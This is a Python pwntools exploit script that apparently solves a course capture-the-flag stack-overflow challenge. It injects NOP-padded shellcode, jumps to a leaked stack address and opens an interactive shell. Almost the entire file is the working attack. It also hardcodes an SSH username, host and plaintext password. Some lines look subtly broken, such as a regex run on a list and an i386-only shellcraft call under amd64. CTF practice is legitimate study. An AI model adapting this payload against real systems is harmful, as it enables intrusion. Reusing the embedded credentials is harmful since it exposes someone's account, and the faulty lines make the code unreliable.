from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
            return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:

        context.clear(arch='amd64', log_level='debug')
        s = ssh('ccrist1', 'cs4401shell.walls.ninja', password='Mv$a$h1*3#')
        s.set_working_directory('/problems/stack4r-64_3_4307b3bdfd8470fcd880b3561b61da40/')
        return s.process([exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
        p = process(exe)
        p.sendlineafter(b'>',payload)
        p.wait()
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
        info('located RIP at {a}'.format(a=ip_offset))
        return ip_offset

gdbscript = '''
              init-pwndbg
              continue
'''.format(**locals())

exe = './stack4-64'

elf = context.binary = ELF(exe, checksec=False)

context.log_level = 'debug'

#exploit

offset = 100

io = start()

io.recvlines(6)

stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlines()).group(0), 16)

shellcode = asm(shellcraft.amd64.popad())
shellcode += asm(shellcraft.amd64.sh(),arch='amd64')

padding = asm('nop') * (offset - len(shellcode))

payload = flat([
    padding,
    shellcode,
    stack_addr
    ])

io.sendlineafter(b'>',payload) 
io.interactive()

